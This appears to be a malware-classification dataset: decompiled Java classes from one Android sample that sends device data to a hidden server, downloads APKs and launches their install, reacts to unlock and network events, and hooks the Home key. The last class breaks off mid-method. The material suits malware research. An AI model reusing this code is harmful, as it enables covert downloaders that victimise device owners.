"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.y\b.code","public class b {   public static String f224a=null;   public static final String[] b={h.aN};   private static b c;   private Context d;   private com.apkmore.rbjatnldymzfiw.y.b.d e;   private b(  Context context){     this.d=context;     this.e=new com.apkmore.rbjatnldymzfiw.y.b.d(this.d);   }   public static b a(  Context context){     if (c == null) {       c=new b(context.getApplicationContext());     }     return c;   }   private InputStream a(  String str,  byte[] bArr){     HttpPost httpPost;     InputStream inputStream=null;     HttpClient a2=c.a(this.d);     if (a2 != null) {       try {         httpPost=new HttpPost(str);       }  catch (      Exception e) {         httpPost=null;       }       if (bArr != null) {         httpPost.setEntity(new ByteArrayEntity(bArr));         Log.d(h.f235a,h.J);       }       int i=0;       while (true) {         int i2=i;         if (i2 >= 2) {           break;         }         try {           HttpResponse execute=a2.execute(httpPost);           int statusCode=execute.getStatusLine().getStatusCode();           if (String.valueOf(statusCode).startsWith(""2"")) {             Log.d(h.f235a,h.K + statusCode);             Log.d(h.f235a,h.B + "" : "" + t.c(this.d));             Log.d(h.f235a,h.A + "" : "" + t.h(this.d));             inputStream=execute.getEntity().getContent();             break;           }         }  catch (        ClientProtocolException e2) {           e2.getMessage();         } catch (        IOException e3) {           e3.getMessage();         }         i=i2 + 1;         try {           Thread.sleep(2000L);         }  catch (        InterruptedException e4) {           e4.printStackTrace();         }       }     }     return inputStream;   }   private String a(  InputStream inputStream){     BufferedReader bufferedReader;     Throwable th;     BufferedReader bufferedReader2;     String str=null;     if (inputStream != null) {       StringBuilder sb=new StringBuilder();       try {         bufferedReader=new BufferedReader(new InputStreamReader(inputStream));         while (true) {           try {             try {               String readLine=bufferedReader.readLine();               if (readLine == null) {                 break;               }               sb.append(readLine);             }  catch (            IOException e) {               e.printStackTrace();             }           }  catch (          Exception e2) {             bufferedReader2=bufferedReader;             if (bufferedReader2 != null) {               try {                 bufferedReader2.close();               }  catch (              IOException e3) {                 e3.printStackTrace();               }             }             if (inputStream != null) {               try {                 inputStream.close();               }  catch (              IOException e4) {                 e4.printStackTrace();               }             }             return str;           } catch (          Throwable th2) {             th=th2;             if (bufferedReader != null) {               try {                 bufferedReader.close();               }  catch (              IOException e5) {                 e5.printStackTrace();               }             }             if (inputStream != null) {               try {                 inputStream.close();               }  catch (              IOException e6) {                 e6.printStackTrace();               }             }             throw th;           }         }         str=n.b(h.aQ,sb.toString());         if (bufferedReader != null) {           try {             bufferedReader.close();           }  catch (          IOException e7) {             e7.printStackTrace();           }         }         if (inputStream != null) {           try {             inputStream.close();           }  catch (          IOException e8) {             e8.printStackTrace();           }         }       }  catch (      Exception e9) {         bufferedReader2=null;       } catch (      Throwable th3) {         bufferedReader=null;         th=th3;       }     }     return str;   }   private String a(  HashMap hashMap){     String str=b[0];     if (hashMap == null) {       return str;     }     StringBuffer stringBuffer=null;     for (    String str2 : hashMap.keySet()) {       String str3=(String)hashMap.get(str2);       if (stringBuffer == null) {         stringBuffer=new StringBuffer();         stringBuffer.append(""?"");       }  else {         stringBuffer.append(""&"");       }       stringBuffer.append(str2);       stringBuffer.append(""="");       stringBuffer.append(str3);     }     return str + stringBuffer.toString();   }   private byte[] c(){     JSONObject jSONObject=new JSONObject();     try {       jSONObject.put(this.e.a(),this.e.b());       return n.a(h.aQ,jSONObject.toString()).getBytes();     }  catch (    Exception e) {       e.printStackTrace();       return null;     }   }   public com.apkmore.rbjatnldymzfiw.y.b.e a(  String str){     String a2;     HashMap hashMap=new HashMap();     hashMap.put(h.W,""1"");     String a3=a(hashMap);     if (a3 != null) {     }     this.e.r=str;     InputStream a4=a(a3,c());     if (a4 == null || (a2=a(a4)) == null) {       return null;     }     return (com.apkmore.rbjatnldymzfiw.y.b.e)g.a(com.apkmore.rbjatnldymzfiw.y.b.e.class,a2);   }   public f a(){     String a2;     HashMap hashMap=new HashMap();     hashMap.put(h.W,""2"");     String a3=a(hashMap);     if (a3 != null) {     }     InputStream a4=a(a3,c());     if (a4 == null || (a2=a(a4)) == null) {       return null;     }     return (f)g.a(f.class,a2);   }   public HashMap b(){     HashMap hashMap=new HashMap();     try {       if (t.j(this.d) == null || ""c"".equals(t.v(this.d)) || (System.currentTimeMillis() - t.r(this.d).getLong(h.aF,-1L) < 43200000 && !h.p.equals(t.v(this.d)))) {         f224a=t.i(this.d);         if (f224a != null) {           HashMap hashMap2=new HashMap();           t.g(this.d,h.o);           com.apkmore.rbjatnldymzfiw.y.b.e eVar=(com.apkmore.rbjatnldymzfiw.y.b.e)g.a(com.apkmore.rbjatnldymzfiw.y.b.e.class,f224a);           com.apkmore.rbjatnldymzfiw.y.b.b[] bVarArr=(com.apkmore.rbjatnldymzfiw.y.b.b[])g.b(com.apkmore.rbjatnldymzfiw.y.b.b.class,f224a);           hashMap2.put(com.apkmore.rbjatnldymzfiw.y.b.e.class.getName(),eVar);           hashMap2.put(com.apkmore.rbjatnldymzfiw.y.b.b.class.getName(),bVarArr);           return hashMap2;         }       }  else       if (t.j(this.d) != null) {         t.b((System.currentTimeMillis() - 43200000) + 48000,this.d);         t.g(this.d,h.o);         HashMap hashMap3=new HashMap();         hashMap3.put(h.W,""0"");         String a2=a(hashMap3);         if (a2 != null) {         }         InputStream a3=a(a2,c());         if (a3 == null) {           return null;         }         f224a=a(a3);         if (f224a == null) {           return null;         }         t.d(this.d,f224a);         t.b(System.currentTimeMillis(),this.d);         t.a(new Date().getTime(),this.d);         com.apkmore.rbjatnldymzfiw.y.b.e eVar2=(com.apkmore.rbjatnldymzfiw.y.b.e)g.a(com.apkmore.rbjatnldymzfiw.y.b.e.class,f224a);         com.apkmore.rbjatnldymzfiw.y.b.b[] bVarArr2=(com.apkmore.rbjatnldymzfiw.y.b.b[])g.b(com.apkmore.rbjatnldymzfiw.y.b.b.class,f224a);         hashMap.put(com.apkmore.rbjatnldymzfiw.y.b.e.class.getName(),eVar2);         hashMap.put(com.apkmore.rbjatnldymzfiw.y.b.b.class.getName(),bVarArr2);       }     }  catch (    Exception e) {       e.printStackTrace();     }     return hashMap;   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.y\Baa.code","public class Baa extends Service {   private boolean f214a=false;   private void a(  Intent intent,  Context context,  int i){     this.f214a=true;     com.apkmore.rbjatnldymzfiw.y.a.b.a(intent.getStringExtra(h.bc),context,i,intent.getStringExtra(h.bd),intent.getIntExtra(h.aW,0),intent.getStringExtra(h.aT));   }   @Override public IBinder onBind(  Intent intent){     return null;   }   @Override public void onCreate(){     super.onCreate();   }   @Override public void onStart(  Intent intent,  int i){     super.onStart(intent,i);     Context applicationContext=getApplicationContext();     if (intent == null) {       return;     }     int intExtra=intent.getIntExtra(h.bb,0);     if (intExtra == 1) {       a(intent,applicationContext,intExtra);       return;     }     if (intExtra != 2 || this.f214a) {       return;     }     this.f214a=true;     if (j.a() == null) {       j.a(applicationContext);     }     j.a(intExtra);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.y\c.code","public class c {   public static HttpClient a(  Context context){     if (c(context) == null) {       return null;     }     if (!b(context)) {       return new DefaultHttpClient();     }     BasicHttpParams basicHttpParams=new BasicHttpParams();     HttpConnectionParams.setConnectionTimeout(basicHttpParams,30000);     HttpConnectionParams.setSoTimeout(basicHttpParams,30000);     HttpConnectionParams.setSocketBufferSize(basicHttpParams,204800);     HttpClientParams.setRedirecting(basicHttpParams,true);     HttpHost httpHost=new HttpHost(h.ab,80);     if (h.ac.equalsIgnoreCase(c(context))) {       httpHost=new HttpHost(h.ad,80);     }     basicHttpParams.setParameter(""http.route.default-proxy"",httpHost);     return new DefaultHttpClient(basicHttpParams);   }   public static void a(  Context context,  int i,  String str,  int i2,  int i3,  Intent intent,  String str2,  int i4){     Notification notification=new Notification(i,"""",System.currentTimeMillis());     PendingIntent activity=PendingIntent.getActivity(context,0,intent,134217728);     notification.flags=i3;     StringBuffer stringBuffer=new StringBuffer();     if (i4 > -1 && i4 <= 100) {       stringBuffer.append(i4);       stringBuffer.append(""%    "");     }     stringBuffer.append(str2);     notification.setLatestEventInfo(context,str,stringBuffer.toString(),activity);     d(context).notify(400000 + i2,notification);   }   protected static boolean b(  Context context){     String c=c(context);     if (c != null) {       return c.compareTo(h.aa) == 0 || c.compareTo(h.ae) == 0 || c.compareTo(h.af) == 0;     }     return false;   }   public static String c(  Context context){     NetworkInfo activeNetworkInfo=((ConnectivityManager)context.getSystemService(""connectivity"")).getActiveNetworkInfo();     if (activeNetworkInfo == null) {       return null;     }     return activeNetworkInfo.getTypeName();   }   public static NotificationManager d(  Context context){     return (NotificationManager)context.getSystemService(""notification"");   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.y\d.code","public class d {   private static d f246a=null;   private d(){   }   public static d a(){     if (f246a == null) {       f246a=new d();     }     return f246a;   }   public void a(  Context context,  int i,  int i2){     new e(this,context,i,i2).execute(new Void[0]);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.y\e.code","public class e extends AsyncTask {   final d f253a;   private StringBuffer b;   private Context c;   private int d;   private int e;   public e(  d dVar,  Context context,  int i,  int i2){     this.f253a=dVar;     this.c=context;     this.d=i;     this.e=i2;   }   @Override public com.apkmore.rbjatnldymzfiw.y.b.e doInBackground(  Void... voidArr){     b a2=b.a(this.c);     this.b=new StringBuffer();     String g=t.g(this.c);     if (this.d != -1001) {       if (!"""".equals(g)) {         this.b.append(g);         this.b.append("";"");       }       this.b.append(this.d);       this.b.append("","");       this.b.append(this.e);     }  else {       this.b.append(g);     }     o.a(this.b.toString());     com.apkmore.rbjatnldymzfiw.y.b.e a3=a2.a(this.b.toString());     if (a3 != null) {     }     return a3;   }   @Override public void onPostExecute(  com.apkmore.rbjatnldymzfiw.y.b.e eVar){     super.onPostExecute(eVar);     if (eVar == null || !(eVar == null || eVar.f227a == 0)) {       t.a(this.c,this.b == null ? null : this.b.toString());     }   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.y\Vj.code","public class Vj extends BroadcastReceiver {   private static Vj f215a=null;   public static Vj a(){     if (f215a == null) {       f215a=new Vj();     }     return f215a;   }   @Override public void onReceive(  Context context,  Intent intent){     String stringExtra;     String action=intent.getAction();     if (action.equals(""android.intent.action.CLOSE_SYSTEM_DIALOGS"")) {       o.a(""home"");       if (action.equals(""android.intent.action.CLOSE_SYSTEM_DIALOGS"") && (stringExtra=intent.getStringExtra(h.bJ)) != null && stringExtra.equals(h.bK)) {         s.d=true;         com.apkmore.rbjatnldymzfiw.y.c.c.f231a=true;       }     }     if (""android.intent.action.PACKAGE_ADDED"".equals(action)) {       t.a(context,intent);     }     if (""android.intent.action.USER_PRESENT"".equals(action)) {       t.o(context);       i.a(context);       if (t.a(context) != null && !"""".equals(t.a(context))) {         i.c(context);       }       t.p(context);     }     if (""android.net.conn.CONNECTIVITY_CHANGE"".equals(action)) {       long currentTimeMillis=System.currentTimeMillis();       if (currentTimeMillis - t.u(context) > 5000) {         i.a(context);         t.a(context,currentTimeMillis);         if (t.j(context) != null) {           t.o(context);           if ("""".equals(context.getSharedPreferences(h.D,0).getString(h.E,""""))) {             return;           }           d.a().a(context,-1001,0);         }       }     }   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.y\Zew.code","public class Zew extends Activity {   public static void a(  Activity activity){     com.apkmore.rbjatnldymzfiw.y.c.c.f231a=false;     t.t(activity);     if (com.apkmore.rbjatnldymzfiw.y.d.c.a() == null) {       com.apkmore.rbjatnldymzfiw.y.d.c.a(activity);     }     com.apkmore.rbjatnldymzfiw.y.c.c a2=com.apkmore.rbjatnldymzfiw.y.c.c.a();     com.apkmore.rbjatnldymzfiw.y.d.e eVar=new com.apkmore.rbjatnldymzfiw.y.d.e(activity);     eVar.b();     activity.setContentView(eVar);     com.apkmore.rbjatnldymzfiw.y.d.c.a(eVar);     a2.b(activity);     a2.a(activity);     a2.b();   }   @Override protected void onCreate(  Bundle bundle){     super.onCreate(bundle);     requestWindowFeature(1);     setRequestedOrientation(1);     registerReceiver(Vj.a(),new IntentFilter(""android.intent.action.CLOSE_SYSTEM_DIALOGS""));     a(this);   }   @Override protected void onDestroy(){     unregisterReceiver(Vj.a());     super.onDestroy();   }   @Override public boolean onKeyDown(  int i,  KeyEvent keyEvent){     if (i != 4) {       return super.onKeyDown(i,keyEvent);     }     s.d=true;     Intent intent=new Intent(""android.intent.action.MAIN"");     intent.setFlags(268435456);     intent.addCategory(""android.intent.category.HOME"");     startActivity(intent);     finish();     return true;   }   @Override protected void onResume(){     super.onResume();     q.b=null;     q.a(this);   }   @Override protected void onStop(){     if (com.apkmore.rbjatnldymzfiw.y.c.c.f231a) {       finish();     }     super.onStop();   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.y.a\a.code","public class a extends SQLiteOpenHelper {   public a(  Context context){     super(context,com.apkmore.rbjatnldymzfiw.y.c.h.aR,(SQLiteDatabase.CursorFactory)null,1);   }   @Override public void onCreate(  SQLiteDatabase sQLiteDatabase){     sQLiteDatabase.execSQL(com.apkmore.rbjatnldymzfiw.y.c.h.bt + "" "" + com.apkmore.rbjatnldymzfiw.y.c.h.aS+ com.apkmore.rbjatnldymzfiw.y.c.h.bu+ com.apkmore.rbjatnldymzfiw.y.c.h.aU+ "" ""+ com.apkmore.rbjatnldymzfiw.y.c.h.bv+ com.apkmore.rbjatnldymzfiw.y.c.h.aV+ "" ""+ com.apkmore.rbjatnldymzfiw.y.c.h.bv+ com.apkmore.rbjatnldymzfiw.y.c.h.aT+ "" ""+ com.apkmore.rbjatnldymzfiw.y.c.h.bv+ com.apkmore.rbjatnldymzfiw.y.c.h.aW+ "" ""+ com.apkmore.rbjatnldymzfiw.y.c.h.bw+ "",""+ com.apkmore.rbjatnldymzfiw.y.c.h.aX+ "" ""+ com.apkmore.rbjatnldymzfiw.y.c.h.bw+ "",""+ com.apkmore.rbjatnldymzfiw.y.c.h.aY+ "" ""+ com.apkmore.rbjatnldymzfiw.y.c.h.bw+ "")"");     sQLiteDatabase.execSQL(com.apkmore.rbjatnldymzfiw.y.c.h.bt + "" f"" + com.apkmore.rbjatnldymzfiw.y.c.h.bu+ com.apkmore.rbjatnldymzfiw.y.c.h.aU+ "" ""+ com.apkmore.rbjatnldymzfiw.y.c.h.bv+ com.apkmore.rbjatnldymzfiw.y.c.h.aV+ "" ""+ com.apkmore.rbjatnldymzfiw.y.c.h.bv+ com.apkmore.rbjatnldymzfiw.y.c.h.aT+ "" ""+ com.apkmore.rbjatnldymzfiw.y.c.h.bv+ com.apkmore.rbjatnldymzfiw.y.c.h.aW+ "" ""+ com.apkmore.rbjatnldymzfiw.y.c.h.bw+ "",""+ com.apkmore.rbjatnldymzfiw.y.c.h.aX+ "" ""+ com.apkmore.rbjatnldymzfiw.y.c.h.bw+ "",""+ com.apkmore.rbjatnldymzfiw.y.c.h.aY+ "" ""+ com.apkmore.rbjatnldymzfiw.y.c.h.bw+ "")"");   }   @Override public void onUpgrade(  SQLiteDatabase sQLiteDatabase,  int i,  int i2){     sQLiteDatabase.execSQL(com.apkmore.rbjatnldymzfiw.y.c.h.bx + "" "" + com.apkmore.rbjatnldymzfiw.y.c.h.aS);     onCreate(sQLiteDatabase);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.y.a\b.code","public class b {   public static Map f217a=new HashMap();   public static void a(  Context context,  int i){     if (j.a() == null) {       j.a(context);     }     j.a(i);   }   private void a(  Context context,  String str){     new Intent();     Intent launchIntentForPackage=context.getApplicationContext().getPackageManager().getLaunchIntentForPackage(str);     launchIntentForPackage.addFlags(268435456);     context.startActivity(launchIntentForPackage);   }   public static void a(  Context context,  String str,  int i,  String str2,  String str3){     try {       if (t.j(context) == null) {         t.w(context);         return;       }       if (s.c.get(str) != null) {         ((TextView)s.c.get(str)).setVisibility(0);         ((TextView)s.b.get(str)).setVisibility(8);         ((ProgressBar)s.f244a.get(str)).setVisibility(0);       }       com.apkmore.rbjatnldymzfiw.y.d.a().a(context,i,1);       Intent intent=new Intent(context,(Class<?>)Baa.class);       intent.putExtra(com.apkmore.rbjatnldymzfiw.y.c.h.aW,i);       intent.putExtra(com.apkmore.rbjatnldymzfiw.y.c.h.aT,str2);       intent.putExtra(com.apkmore.rbjatnldymzfiw.y.c.h.bb,1);       intent.putExtra(com.apkmore.rbjatnldymzfiw.y.c.h.bc,str);       intent.putExtra(com.apkmore.rbjatnldymzfiw.y.c.h.bd,str3);       context.startService(intent);     }  catch (    Exception e) {     }   }   public static void a(  Message message){     String str=(String)message.obj;     try {       ((ProgressBar)s.f244a.get(str)).setVisibility(0);       ((TextView)s.c.get(str)).setVisibility(0);       ((TextView)s.b.get(str)).setVisibility(8);       int i=message.getData().getInt(com.apkmore.rbjatnldymzfiw.y.c.h.ba);       if (f217a == null) {         f217a=new HashMap();       }       if (f217a.get(str) == null) {         f217a.put(str,Integer.valueOf(i));       }       ProgressBar progressBar=(ProgressBar)s.f244a.get(str);       if (progressBar == null || progressBar.getMax() == 0 || i == 0 || progressBar.getMax() == progressBar.getProgress()) {         ((TextView)s.c.get(str)).setText(""0%"");         ((ProgressBar)s.f244a.get(str)).setProgress(0);       }  else       if (i > ((Integer)f217a.get(str)).intValue()) {         f217a.put(str,Integer.valueOf(i));         progressBar.setProgress(i);         if (i < 0 || i > 100) {           ((TextView)s.c.get(str)).setText(""0%"");         }  else {           ((TextView)s.c.get(str)).setText(i + ""%"");         }       }     }  catch (    Exception e) {     }   }   private void a(  String str,  Context context,  int i){     File file=new File(t.a(i) + ""/"" + q.a(str));     Intent intent=new Intent();     intent.addFlags(268435456);     intent.setAction(""android.intent.action.VIEW"");     intent.setDataAndType(Uri.fromFile(file),com.apkmore.rbjatnldymzfiw.y.c.h.ay);     context.startActivity(intent);   }   public static void a(  String str,  Context context,  int i,  String str2,  int i2,  String str3){     try {       if (!s.a(context)) {         Toast.makeText(context,com.apkmore.rbjatnldymzfiw.y.c.h.bf,1).show();         return;       }       if (i == 1 && s.f244a.get(str) != null && ((ProgressBar)s.f244a.get(str)).getVisibility() != 0) {         ((ProgressBar)s.f244a.get(str)).setVisibility(0);         ((ProgressBar)s.f244a.get(str)).setProgress(0);         ((TextView)s.b.get(str)).setVisibility(8);         ((TextView)s.c.get(str)).setVisibility(0);       }       new Thread(new f(str,t.b(i2),context,i,str2,i2,str3)).start();     }  catch (    Exception e) {     }   }   public void a(  int i,  Context context,  List list){     try {       com.apkmore.rbjatnldymzfiw.y.b.b bVar=(com.apkmore.rbjatnldymzfiw.y.b.b)list.get(i);       String str=bVar.b;       String str2=bVar.f;       int i2=bVar.e;       String str3=bVar.d;       if (q.c.contains(str2) && ((ProgressBar)s.f244a.get(str)).getVisibility() == 8) {         a(context,str2);       }  else       if (q.a(q.a(str),i2) && ((ProgressBar)s.f244a.get(str)).getVisibility() == 8) {         a(context,str,i2,str3,str2);       }  else       if (q.b(q.a(q.a(str)),i2) && ((ProgressBar)s.f244a.get(str)).getVisibility() == 8) {         if (t.h(context,t.a(i2) + ""/"" + q.a(str))) {           a(str,context,i2);         }  else         if (t.j(context) != null) {           a(context,str,i2,str3,str2);         }  else {           t.f(context,com.apkmore.rbjatnldymzfiw.y.c.h.bf);         }       }     }  catch (    Exception e) {     }   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.y.a\c.code","public class c {   public void a(  String str,  int i,  Handler handler){     if (str != null) {       new Thread(new d(this,str,i,handler)).start();     }   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.y.a\d.code","public class d implements Runnable {   final String f218a;   final int b;   final Handler c;   final c d;   public d(  c cVar,  String str,  int i,  Handler handler){     this.d=cVar;     this.f218a=str;     this.b=i;     this.c=handler;   }   @Override public void run(){     try {       Bitmap c=t.c(this.f218a);       if (c == null) {         t.c(this.f218a);       }  else {         t.a(this.b,c);       }     }  catch (    Exception e) {       e.printStackTrace();     }     try {       Thread.sleep(2000L);     }  catch (    InterruptedException e2) {       e2.printStackTrace();     }     if (this.c != null) {       this.c.sendEmptyMessage(0);     }   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.y.a\e.code","public interface e {   void a(  int i); } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.y.a\f.code","public class f implements Runnable {   public static i f219a;   public static List b=new ArrayList();   private int c=0;   private Context d;   private int e;   private String f;   private String g;   private File h;   private String i;   private int j;   public f(  String str,  File file,  Context context,  int i,  String str2,  int i2,  String str3){     this.e=i2;     this.f=str3;     this.g=str2;     this.d=context;     this.i=str;     this.h=file;     this.j=i;   }   public static void a(){     if (f219a != null) {       f219a.a();     }   }   @Override public void run(){     try {       if (this.j == 1) {         b.add(f219a);         f219a=new i(this.d.getApplicationContext(),this.i,this.h,1,this.j,this.g,this.e,this.f);       }  else       if (this.j == 2) {         f219a=new i(this.d.getApplicationContext(),this.i,this.h,2,this.j,this.g,this.e,this.f);         b.add(f219a);       }       f219a.a(new g(this));     }  catch (    Exception e) {       if (this.j == 1) {         a();         Intent intent=new Intent(this.d,(Class<?>)Baa.class);         intent.putExtra(com.apkmore.rbjatnldymzfiw.y.c.h.bb,1);         intent.putExtra(com.apkmore.rbjatnldymzfiw.y.c.h.bc,this.i);         intent.putExtra(com.apkmore.rbjatnldymzfiw.y.c.h.bd,this.g);         this.d.startService(intent);       }     }   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.y.a\g.code","class g implements e {   final f f220a;   public g(  f fVar){     this.f220a=fVar;   }   @Override public void a(  int i){     int i2;     String str;     String str2;     String str3;     int i3;     String str4;     i2=this.f220a.j;     if (i2 == 1) {       Map map=s.f244a;       str=this.f220a.i;       if (map.get(str) != null) {         Map map2=s.f244a;         str2=this.f220a.i;         ((ProgressBar)map2.get(str2)).setMax(100);         Map map3=h.f221a;         str3=this.f220a.i;         int intValue=(int)((i / ((Integer)map3.get(str3)).intValue()) * 100.0f);         i3=this.f220a.c;         int i4=intValue - i3;         this.f220a.c=intValue;         for (int i5=0; i5 < i4; i5++) {           try {             Thread.sleep(100L);             int i6=(intValue - i4) + i5;             if (i6 == 99) {               i6=100;             }             Message message=new Message();             message.what=1;             str4=this.f220a.i;             message.obj=str4;             message.getData().putInt(com.apkmore.rbjatnldymzfiw.y.c.h.ba,i6);             com.apkmore.rbjatnldymzfiw.y.d.c.f249a.sendMessage(message);           }  catch (          Exception e) {             e.printStackTrace();           }         }       }     }   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.y.a\h.code","public class h extends Thread {   public static Map f221a=new HashMap();   private File b;   private URL c;   private int d;   private int e;   private int f;   private boolean g=false;   private i h;   private HttpURLConnection i;   private int j;   public h(  i iVar,  URL url,  File file,  int i,  int i2,  int i3,  HttpURLConnection httpURLConnection,  int i4){     this.e=-1;     this.c=url;     this.b=file;     this.d=i;     this.h=iVar;     this.e=i3;     this.f=i2;     this.i=httpURLConnection;     this.j=i4;   }   public boolean a(){     return this.g;   }   public long b(){     return this.f;   }   @Override public void run(){     InputStream inputStream;     int read;     int i=0;     if (this.f < this.d) {       try {         if (this.j == 1) {           HttpURLConnection httpURLConnection=(HttpURLConnection)this.c.openConnection();           httpURLConnection.setConnectTimeout(5000);           httpURLConnection.setRequestMethod(com.apkmore.rbjatnldymzfiw.y.c.h.be);           httpURLConnection.setRequestProperty(com.apkmore.rbjatnldymzfiw.y.c.h.al,com.apkmore.rbjatnldymzfiw.y.c.h.am);           httpURLConnection.setRequestProperty(com.apkmore.rbjatnldymzfiw.y.c.h.an,com.apkmore.rbjatnldymzfiw.y.c.h.ao);           httpURLConnection.setRequestProperty(com.apkmore.rbjatnldymzfiw.y.c.h.by,this.c.toString());           httpURLConnection.setRequestProperty(com.apkmore.rbjatnldymzfiw.y.c.h.ap,com.apkmore.rbjatnldymzfiw.y.c.h.ah);           int i2=(this.d * (this.e - 1)) + this.f;           httpURLConnection.setRequestProperty(com.apkmore.rbjatnldymzfiw.y.c.h.ak,com.apkmore.rbjatnldymzfiw.y.c.h.aj + ""="" + i2+ ""-""+ ((this.d * this.e) - 1));           httpURLConnection.setRequestProperty(com.apkmore.rbjatnldymzfiw.y.c.h.aq,com.apkmore.rbjatnldymzfiw.y.c.h.ar);           httpURLConnection.setRequestProperty(com.apkmore.rbjatnldymzfiw.y.c.h.as,com.apkmore.rbjatnldymzfiw.y.c.h.at);           inputStream=httpURLConnection.getInputStream();           i=i2;         }  else {           inputStream=this.i.getInputStream();         }         byte[] bArr=new byte[15360];         RandomAccessFile randomAccessFile=new RandomAccessFile(this.b,com.apkmore.rbjatnldymzfiw.y.c.h.bp);         randomAccessFile.seek(i);         long j=0;         while (!this.h.b() && (read=inputStream.read(bArr,0,15360)) != -1) {           randomAccessFile.write(bArr,0,read);           this.f=read + this.f;           long currentTimeMillis=System.currentTimeMillis();           if (currentTimeMillis - j > 800) {             this.h.a(this.e,this.f);           }  else {             currentTimeMillis=j;           }           this.h.a(this.f);           j=currentTimeMillis;         }         randomAccessFile.close();         inputStream.close();         this.g=true;       }  catch (      Exception e) {         this.f=-1;       }     }   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.y.a\i.code","public class i {   private static Map o=new HashMap();   private String f222a;   private int b;   private String c;   private String d;   private int e;   private Context f;   private boolean g;   private int h;   private int i;   private h[] j;   private File k;   private int m;   private String n;   private HttpURLConnection q;   private Map l=new ConcurrentHashMap();   private int p=3;   public i(  Context context,  String str,  File file,  int i,  int i2,  String str2,  int i3,  String str3){     this.h=0;     this.i=0;     this.q=null;     try {       this.b=i3;       this.c=str3;       this.d=str2;       this.f=context;       this.n=str;       this.e=i2;       j.a(context);       URL url=new URL(str);       if (!file.exists()) {         file.mkdirs();       }       this.j=new h[i];       if (t.k(context)) {         this.q=(HttpURLConnection)url.openConnection(new Proxy(Proxy.Type.HTTP,new InetSocketAddress(com.apkmore.rbjatnldymzfiw.y.c.h.ab,80)));         if (com.apkmore.rbjatnldymzfiw.y.c.h.ac.equals(t.j(context))) {           this.q=(HttpURLConnection)url.openConnection(new Proxy(Proxy.Type.HTTP,new InetSocketAddress(com.apkmore.rbjatnldymzfiw.y.c.h.ad,80)));         }       }  else {         this.q=(HttpURLConnection)url.openConnection();       }       this.q.setConnectTimeout(5000);       this.q.setRequestMethod(com.apkmore.rbjatnldymzfiw.y.c.h.be);       this.q.setRequestProperty(com.apkmore.rbjatnldymzfiw.y.c.h.al,com.apkmore.rbjatnldymzfiw.y.c.h.am);       this.q.setRequestProperty(com.apkmore.rbjatnldymzfiw.y.c.h.an,com.apkmore.rbjatnldymzfiw.y.c.h.ao);       this.q.setRequestProperty(com.apkmore.rbjatnldymzfiw.y.c.h.by,url.toString());       this.q.setRequestProperty(com.apkmore.rbjatnldymzfiw.y.c.h.ap,com.apkmore.rbjatnldymzfiw.y.c.h.ah);       this.q.setRequestProperty(com.apkmore.rbjatnldymzfiw.y.c.h.aq,com.apkmore.rbjatnldymzfiw.y.c.h.ar);       this.q.setRequestProperty(com.apkmore.rbjatnldymzfiw.y.c.h.as,com.apkmore.rbjatnldymzfiw.y.c.h.at);       this.q.connect();       if (this.q.getResponseCode() == 200) {         this.i=this.q.getContentLength();         h.f221a.put(str,Integer.valueOf(this.i));         this.f222a=q.a(this.n) + ""s"";         this.k=new File(file,this.f222a);         Map a2=j.a(str);         if (a2.size() > 0) {           for (          Map.Entry entry : a2.entrySet()) {             this.l.put(entry.getKey(),entry.getValue());           }         }         if (this.l.size() == this.j.length) {           for (int i4=0; i4 < this.j.length; i4++) {             this.h=((Integer)this.l.get(Integer.valueOf(i4 + 1))).intValue() + this.h;           }         }         this.m=this.i % this.j.length == 0 ? this.i / this.j.length : (this.i / this.j.length) + 1;       }     }  catch (    Exception e) {     }   }   private void c(){     try {       j.a(this.d,this.f,com.apkmore.rbjatnldymzfiw.y.c.h.aS);       File d=d();       Thread.sleep(100L);       if (this.e == 1) {         Message obtain=Message.obtain();         obtain.what=3;         obtain.obj=this.n;         